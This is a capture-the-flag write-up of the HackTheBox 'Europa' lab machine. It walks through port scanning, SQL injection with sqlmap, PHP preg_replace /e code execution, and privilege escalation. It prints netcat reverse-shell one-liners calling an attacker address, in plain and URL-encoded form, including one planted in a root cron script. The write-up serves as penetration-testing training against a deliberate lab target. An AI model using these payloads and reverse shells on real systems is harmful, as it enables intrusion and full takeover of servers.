---
title:  "Europa HackTheBox CTF Writeup"
date:   2017-12-02 15:04:23
categories: [CTF]
tags: [HackTheBox, CTF, Hacking, Ethical Hacking, WarGames]
---

![](https://cdn-images-1.medium.com/max/2000/1*wQtNtGf6mVu_jrAurio2zg.jpeg)


Welcome to my write up for the Europa box from [HackTheBox.eu](https://www.hackthebox.eu/) !
Hack The Box is an online platform that allows you to test your penetration testing skills and exchange ideas and methodologies with other members of similar interests. It contains several challenges that are constantly updated.
As an individual, you can complete a simple challenge to prove your skills and then create an account, allowing you to connect to our private network (HTB Labs) where several machines await for you to hack them.
If you want to jack some boxes yourself, try to [hack the invite code](https://www.hackthebox.eu/invite) in order to become a member and get involved. It is a lot of fun!
**My Europa CTF Writeup**
Without any more talk, lets proceed to the Europa CTF and my writeup of the penetration tests I ran against it. Please comment with any questions!

Target Machine: `10.10.10.22`

root@kali:~# nmap -A 10.10.10.22

    Starting Nmap 7.60 ( https://nmap.org ) at 2017–10–28 03:03 EDT
    Nmap scan report for europacorp.htb (10.10.10.22)
    Host is up (0.14s latency).
    Not shown: 997 filtered ports
    PORT STATE SERVICE VERSION
    22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    | 2048 6b:55:42:0a:f7:06:8c:67:c0:e2:5c:05:db:09:fb:78 (RSA)
    | 256 b1:ea:5e:c4:1c:0a:96:9e:93:db:1d:ad:22:50:74:75 (ECDSA)
    |_ 256 33:1f:16:8d:c0:24:78:5f:5b:f5:6d:7f:f7:b4:f2:e5 (EdDSA)
    80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Apache2 Ubuntu Default Page: It works
    443/tcp open ssl/http Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Apache2 Ubuntu Default Page: It works
    | ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
    | Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
    | Not valid before: 2017–04–19T09:06:22
    |_Not valid after: 2027–04–17T09:06:22
    |_ssl-date: TLS randomness does not represent time
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Aggressive OS guesses: Linux 3.10–4.8 (92%), Linux 3.13 (92%), Linux 3.2–4.8 (92%), Linux 3.12 (90%), Linux 3.13 or 4.2 (90%), Linux 3.16 (90%), Linux 3.16–4.6 (90%), Linux 3.18 (90%), Linux 3.8–3.11 (90%), Linux 4.4 (90%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    TRACEROUTE (using port 443/tcp)
    HOP RTT ADDRESS
    1 144.50 ms 10.10.14.1
    2 144.51 ms europacorp.htb (10.10.10.22)
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 42.71 seconds

From this scan we see can some interesting information about the ssl certificate.

    DNS = www.europacorp.htb
    DNS = admin-portal.europacorp.htb

If we visit the hot by it’s ip we get the default apache site, and if you type [https://10.10.10.22](https://10.10.10.22/) you will be redirected to the default apache site. That is because the ssl certificate only works on the two domains the parent domain [www.europacorp.htb](http://www.europacorp.htb/) and the sub domain admin-portal.europa.htb. In order for the domain association to work you need to edit /etc/hosts file and add in the ip and the dns record. In this case the host file would look like this.


    10.10.10.22 www.europacorp.htb
    10.10.10.22 admin-portal.europacorp.htb

Now [https://www.europacorp.htb](https://www.europacorp.htb/) points to 10.10.10.22 which is still the apache page but if we go to [https://admin-portal.euroapcorp.htb](https://admin-portal.euroapcorp.htb/) Were brought to a login page, cool now we can continue to do some more enumeration… Scanning for folders and files in `10.10.10.22:443` gave us nothing but if we try the sub-domain [https://admin-portal.euroapcorp.htb](https://admin-portal.euroapcorp.htb/) we get


    DirBuster 1.0-RC1 — Report
    http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
    Report produced on Fri Oct 27 15:38:27 EDT 2017
     — — — — — — — — — — — — — — — —
    https://admin-portal.europacorp.htb:443
     — — — — — — — — — — — — — — — —
    Directories found during testing:
    Dirs found with a 302 response:
    /
    Dirs found with a 403 response:
    /icons/
    /js/
    /data/
    /vendor/
    /dist/
    /icons/small/
    /dist/css/
    /logs/
    /dist/js/
    — — — — — — — — — — — — — — — —
    Files found during testing:
    Files found with a 302 responce:
    /index.php
    /tools.php
    /logout.php
    /dashboard.php
    Files found with a 200 responce:
    /login.php
    /db.php
     — — — — — — — — — — — — — — — —

The only two files we can work with is `/login.php` and `/db.php`, the `db.php`file was empty, so then I tried poking around at the login page I started by sending some Sqli queries, but it seems like nothing was happening when you inject queries in the login page. I then started Burpsuite to have a closer look at what happens when I send a request.

![](https://cdn-images-1.medium.com/max/1000/1*pGXzGRGq6E0FB1JXFARvPA.gif)


Since the site seems to be vulnerable to SQL Injection, I used sqlmap to perform an automatic sqli test.

    sqlmap -u https://admin-portal.europacorp.htb/login.php --form --dbms=mysql

and we get the credentials


    Admin-portalCreds:
    login: admin@europacorp.htb
    pw: SuperSecretPassword!

Now that we have the credentials we can log in and access the main dashboard.

![](https://cdn-images-1.medium.com/max/1000/1*rDd8XBx2K87mET9HBlfY2Q.png)


We also have access to the Tools Dashboard what seems to be an OpenVPN Configuration Generator that allows the user to enter an ip address and it generates an openvpn configuration file.

![](https://cdn-images-1.medium.com/max/1000/1*C5Tj6O4D5NBOuZCIG1deFQ.png)


I started the proxy to intercept what happens once I click on generate, this is what we get

![](https://cdn-images-1.medium.com/max/1000/1*hha542jdRaE6AHPYkQ5MLQ.png)


If you look closely its asking us for a pattern, that pattern is a regular expression `%2F` which translates to `/`and an ip address then `%2F` again then they ask us for the actual ip address you want to enter and then the `text`variable has the openvpn generator template with the variables of the pattern. If we look at the params of this request it is easier to see what they want to do

![](https://cdn-images-1.medium.com/max/1000/1*3hpjTfxkxWUITqvlxbyCaw.png)


There is a famous regular expression vulnerability in php. The `e` modifier is a deprecated regex modifier which allows you to use php code within your regular expression. It is therefore possible to craft input such that the substituted code runs arbitrary PHP functions or exposes private variables.

    $input = “Exploitable regex.”;
    echo preg_replace(“/([a-z]*)/e”, “strtoupper(‘\\1’)”, $input);

This will output `EXPLOITABLE REGEX`

> Let us assume as part of our attack vector we want the `phpinfo()`command to fire. In order to do this we might manipulate the value of `$string` so that the code executed as follows: `$string = "phpinfo()";`
>
`print preg_replace('/^(.*)/', 'strtoupper(\\1)', $string);`

> Without the ‘/e’ flag, however, the code simply outputs: `strtoupper(phpinfo())` If we add the flag, like so:     
> ```
<?php
$string = "phpinfo()";
print preg_replace('/^(.*)/e', 'strtoupper(\\1)', $string);?>```

> The function fires and calling the page will actually result in the phpinfo() command spilling results onto the screen.

I did some digging on the vulnerability and I came across a few useful link[s https://bitquark.co.uk/blog/2013/07/2 /the_unexpected_dangers_of_preg_replace](https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace)

 I replaced the pattern value with `%2F%5E%28%2E%2A%29%2F%65` which is url encoded if you decode it the result is `/^(.*)/e`
 and the ipaddress field with the value with ``id`` the ` has to be present or else the /e regex filters won’t filter the pattern properly. If we send the request you can see that under OpenVpn Config Generator there’s the `uid` of the user managing the web server, which is `www-data`.

![](https://cdn-images-1.medium.com/max/800/1*R2AqolR3EeJOw1yZTa-mWA.png)


This mean we have remote code execution on this web server using the regex vulnerability. Now we can create a reverse shell to run on the remote system, Netcat was installed on this system so I made my nc reverse shell


    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i%
    202>&1|nc 10.10.14.x 4444 >/tmp/f

I encoded my shell in URL format. The above shell url encoded would be

    %72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%25%0a%32%30%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%35%2e%78%20%34%34%34%34%20%3e%2f%74%6d%70%2f%66

Now we need to add our encoded shell to the ipaddress value with ``%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%25%0a%32%30%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%35%2e%78%20%34%34%34%34%20%3e%2f%74%6d%70%2f%66`` then we just start our netcat listener `nc -lvp 4444`Click on go in BurpSuite we should have a reverse shell.

![](https://cdn-images-1.medium.com/max/1000/1*fVToYOoEDXZJ3K8ZpQ4GBQ.png)


**Privileged Escalation**
I uploaded LinEnum.sh to /tmp and I noticed that a php file being executed by cron every minute in `/var/www/cronjobs/clearlogs`

![](https://cdn-images-1.medium.com/max/600/1*D9-eBSBYryXkeUDLXFYfkQ.png)


As you can see this file executes a file named `logcleared.sh`under `/var/www/cmd/logcleared.sh`
I went over to the `cmd` directory and the file did not exist or maybe it did before but another user deleted it I redirected another netcat reverse shell to the logcleared.sh file.


    echo 'rm /tmp/fuck;mkfifo /tmp/fuck;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.x 1234 >/tmp/fuck' > /var/www/cmd/logcleared.sh

Since the shell I was currently running was named `f` I had to name the new reverse shell file to something else If I didn’t change the reverse shell name I would assume that it would append to the reverse shell file and some corruption would happen. I opened a new nc instance on port 1234 and after a few seconds were get shell on the system as root!

![](https://cdn-images-1.medium.com/max/1000/1*62klzzrXYup7nFDEbZVXOA.png)

![](https://cdn-images-1.medium.com/max/800/1*CNv4IjYVeBjdOBGvHJV0Ng.gif)


You can follow me on twitter [@0katz](https://www.twitter.com/0katz)

## #TogetherWeHitHarder
